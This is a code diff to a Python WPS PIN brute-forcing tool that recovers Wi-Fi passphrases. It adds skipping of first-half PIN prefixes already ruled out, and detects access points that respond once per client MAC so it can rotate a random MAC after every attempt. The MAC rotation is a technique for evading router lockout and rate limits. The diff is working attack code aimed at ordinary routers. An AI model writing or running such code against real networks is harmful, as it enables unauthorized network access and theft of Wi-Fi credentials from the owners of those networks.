@@ -21,7 +21,7 @@ import asyncio
 import json
 import logging
 import time
-from dataclasses import asdict, dataclass
+from dataclasses import asdict, dataclass, field
 from pathlib import Path
 from typing import Optional
 
@@ -44,6 +44,11 @@ class CampaignState:
     p2_index: int = 0
     first_half: Optional[str] = None
     skip_middle: Optional[str] = None  # The middle-3 of the (4+3+checksum) PIN.
+    # First-halves the AP already ruled out (M4 first_half_wrong). Once "1234" is wrong,
+    # every 1234-XXXX candidate is wrong too — skip them (COMMON dups like
+    # 12345670/12345678, and the sweep later re-hitting a COMMON prefix). Persisted, so
+    # resume reconstructs the exact same candidate stream.
+    dead_first_halves: list[str] = field(default_factory=list)
     found_pin: Optional[str] = None
     found_psk: Optional[str] = None
     attempts: int = 0     # sessions started (incl. rate-limited no-ops)
@@ -141,6 +146,16 @@ class WpsCampaign(Campaign):
         self._lock_end_at: Optional[float] = None
         self._consecutive_locks_no_progress = 0
 
+        # COMMON-phase candidates (OUI-known default PINs can seed the front of this).
+        self._common_pins = list(pinmod.COMMON_PINS)
+
+        # One-shot-per-MAC detection. Some APs answer the first WSC exchange from a client
+        # MAC then ignore it. _mac_reached_oracle = did the current MAC get a real reply;
+        # _ap_one_shot latches once we've seen the ignore, and from then we rotate
+        # proactively after each oracle result so no attempt is wasted on a spent MAC.
+        self._mac_reached_oracle = False
+        self._ap_one_shot = False
+
     # ---- persistence --------------------------------------------------------
     def _load_state(self) -> CampaignState:
         path = _state_path(self.state_dir, self.bssid)
@@ -209,7 +224,7 @@ class WpsCampaign(Campaign):
         elif self.state.phase == "second_half":
             remaining = 1000 - self.state.p2_index
         elif self.state.phase == "common":
-            remaining = len(pinmod.COMMON_PINS) - self.state.common_index + 10000 + 1000
+            remaining = len(self._common_pins) - self.state.common_index + 10000 + 1000
         else:
             return 0.0
         return remaining * self._attempt_ewma
@@ -245,12 +260,20 @@ class WpsCampaign(Campaign):
         if st.phase == "verify":
             return st.found_pin  # Verify the already-found PIN
         if st.phase == "common":
-            if st.common_index < len(pinmod.COMMON_PINS):
-                return pinmod.COMMON_PINS[st.common_index]
+            while st.common_index < len(self._common_pins):
+                candidate = self._common_pins[st.common_index]
+                if candidate[:4] in st.dead_first_halves:   # first half already ruled out
+                    st.common_index += 1
+                    continue
+                return candidate
             st.phase = "first_half"
         if st.phase == "first_half":
-            if st.p1_index < 10000:
-                return pinmod.full_pin(f"{st.p1_index:04d}", "000")
+            while st.p1_index < 10000:
+                first4 = f"{st.p1_index:04d}"
+                if first4 in st.dead_first_halves:           # e.g. a COMMON prefix already tried
+                    st.p1_index += 1
+                    continue
+                return pinmod.full_pin(first4, "000")
             st.phase = "failed"  # Never encountered "Second half wrong"
             return None
         if st.phase == "second_half" and st.first_half is not None:
@@ -295,7 +318,13 @@ class WpsCampaign(Campaign):
             else:
                 st.p2_index += 1
         elif out.result is PinResult.FIRST_HALF_WRONG:
+            # This first half is dead — record it so we skip any other candidate that
+            # shares it. Only the COMMON phase needs to add (the sweep is monotonic and
+            # never revisits a prefix), which keeps the persisted set to a handful.
             if st.phase == "common":
+                first4 = pin[:4]
+                if first4 not in st.dead_first_halves:
+                    st.dead_first_halves.append(first4)
                 st.common_index += 1
             elif st.phase == "first_half":
                 st.p1_index += 1
@@ -401,6 +430,9 @@ class WpsCampaign(Campaign):
                     self._save_state()
                     self.status = "found"
                     break
+
+                self._after_attempt_mac_check(out)
+
                 if self.state.attempts % self._SAVE_EVERY == 0:
                     self._save_state()
                 if self.inter_attempt_delay:
@@ -463,6 +495,23 @@ class WpsCampaign(Campaign):
             return 0.0
         return max(0.0, self._lock_end_at - time.monotonic())
 
+    def _after_attempt_mac_check(self, out: AttemptOutcome) -> None:
+        """One-shot-per-MAC handling. Some APs (e.g. AirLink) answer the first WSC
+        exchange from a client MAC then ignore it. If this MAC already reached the oracle
+        and now gets a no-reply, that's the tell — latch _ap_one_shot; thereafter rotate
+        proactively after every oracle result so no attempt is wasted on a spent MAC.
+        A fresh MAC's first no-reply is left to the strike/lock path (far/rate-limited AP)."""
+        if out.reached_m1:
+            self._mac_reached_oracle = True
+            if self._ap_one_shot:
+                self._rotate_mac()
+        elif out.result is PinResult.TIMEOUT and self._mac_reached_oracle:
+            if not self._ap_one_shot:
+                self._ap_one_shot = True
+                self.log("[dim]AP answers once per MAC — rotating after each attempt[/dim]")
+            self.lock.note_progress()   # a spent MAC isn't a lock; clear the strike it added
+            self._rotate_mac()
+
     def _rotate_mac(self) -> None:
         """Tear down the association + transport and select a new random MAC address."""
         if self.transport is not None:
@@ -475,6 +524,7 @@ class WpsCampaign(Campaign):
         self.our_mac = random_client_mac()
         logger.debug("WPS rotated MAC %s -> %s", old.hex(), self.our_mac.hex())
         self._last_attempt_sig = None
+        self._mac_reached_oracle = False   # fresh MAC hasn't been engaged yet
 
     def _log_attempt(self, pin: str, out: AttemptOutcome,
                      prev_first_half: Optional[str]) -> None:
